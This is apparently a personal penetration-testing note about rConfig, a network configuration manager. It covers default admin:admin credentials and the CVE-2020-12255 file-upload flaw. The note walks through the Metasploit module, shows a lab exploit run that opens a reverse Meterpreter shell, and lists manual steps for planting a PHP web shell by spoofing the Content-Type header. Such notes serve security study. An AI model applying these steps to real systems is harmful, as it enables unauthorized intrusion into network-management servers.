---
id: rConfig
aliases: []
tags:
  - Networking/Software/rConfig
links: "[[Networking]]"
---

# rConfig

[rConfig](https://www.rconfig.com/)
is a Multi-Vendor Open Network Configuration Management Platform

[rConfig](https://github.com/rconfig/rconfig)
is used by network & system administrators
to automate the process of configuring network appliances
(*e.g., remotely configuring network interfaces
with IP addressing information on multiple routers simultaneously*)

<!-- Example {{{-->
> [!example]-
>
> rConfig Login Page
>
> ![[rconfig.png]]
>
<!-- }}} -->

___

<!-- Configuration {{{-->
## Configuration

**rConfig** stores the managed device details in the
`devicedetails` directory at the root of the file system

```sh
s -al /devicedetails
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ls -al /devicedetails
> ```
>
> ```sh
> -rw-r--r--   1 root root 568 Oct 18  2021 edgerouter-isp.yml
> -rw-r--r--   1 root root 179 Oct 18  2021 hostnameinfo.txt
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Exploitation {{{-->
## Exploitation

<!-- Login {{{-->
### Login

Log in with default credentials

<!-- Danger {{{-->
> [!danger]
>
> Default Credentials
>
> ```sh
> admin:admin
> ```
>
<!-- }}} -->

<!-- }}} -->

<!-- CVE Exploits {{{-->
### CVE Exploits

<!-- CVE-2020-12255 {{{-->
#### CVE-2020-12255

[CVE-2020-12255](https://nvd.nist.gov/vuln/detail/CVE-2020-12255) —
rConfig Vendors Auth File Upload RCE

Config `3.9.4` is vulnerable to remote code execution
due to improper validation in the file upload functionality.

`vendor.crud.php` accepts a file upload by checking content-type
without considering the file extension and header.

Thus, an attacker can exploit this by uploading a `.php` file
to `vendor.php` that contains arbitrary PHP code
and changing the content-type to image/gif.

[[Pentest/Tools/Metasploit/Metasploit]] — [rConfig Vendors Auth File Upload RCE](https://www.rapid7.com/db/modules/exploit/linux/http/rconfig_vendors_auth_file_upload_rce/)

<!-- Info {{{-->
> [!info]-
>
> This module allows an attacker with a privileged rConfig account
> to start a reverse shell due to an arbitrary file upload vulnerability
> in `/lib/crud/vendors.crud.php`.
>
> Then, the uploaded payload can be triggered
> by a call to `images/vendor/.php`
>
<!-- }}} -->

```sh
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

<!-- Example {{{-->
> [!example]-
>
> The exploit process
>
> - Checks for the vulnerable version of rConfig
> - Authenticates with the rConfig web login
> - Uploads a PHP-based payload for a reverse shell connection
> - Deletes the payload
> - Leaves with a Meterpreter shell session
>
> ```sh
> msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit
> ```
> ```sh
> [*] Started reverse TCP handler on 10.10.14.111:4444 
> [*] Running automatic check ("set AutoCheck false" to disable)
> [+] 3.9.6 of rConfig found !
> [+] The target appears to be vulnerable. Vulnerable version of rConfig found !
> [+] We successfully logged in !
> [*] Uploading file 'olxapybdo.php' containing the payload...
> [*] Triggering the payload ...
> [*] Sending stage (39282 bytes) to 10.129.201.101
> [+] Deleted olxapybdo.php
> [*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860) at 2021-09-27 13:49:34 -0400
> ```sh
> ```sh
> meterpreter >
> ```
>
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

<!-- File Upload {{{-->
### File Upload

Arbitrary File Upload RCE in rConfig version <= `v3.9.6`

[[Pentest/Tools/Metasploit/Metasploit]] — [rConfig Vendors Auth File Upload RCE](https://www.rapid7.com/db/modules/exploit/linux/http/rconfig_vendors_auth_file_upload_rce/)

```sh
use rconfig_vendors_auth_file_upload_rce
```

**Manual Exploit**

1. [[#Login|Log in]] with default credentials

2. Navigate to `Devices` > `Vendors`

3. Select `Add Vendor` and upload a
   [[Shells/Examples/PHP#Web Shells|PHP Web Shell]]

<!-- Example {{{-->
> [!example]-
>
> ![[rconfig-vendors.png]]
>
<!-- }}} -->

4. Capture the [[Networking/Services/HTTP/General#POST|POST]] request
   and edit the [[Webapp/General/HTTP/Header/General#Content-Type|Content-Type]] header

```sh
Content-Type: image/gif
```

<!-- Example {{{-->
> [!example]-
>
> ![[rconfig-burp.png]]
>
<!-- }}} -->

5. Query the web shell in `/images/vendor/`

```sh
https://$target/images/vendor/shell.php
```

<!-- Example {{{-->
> [!example]-
>
> ![[rconfig-web-shell.png]]
>
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
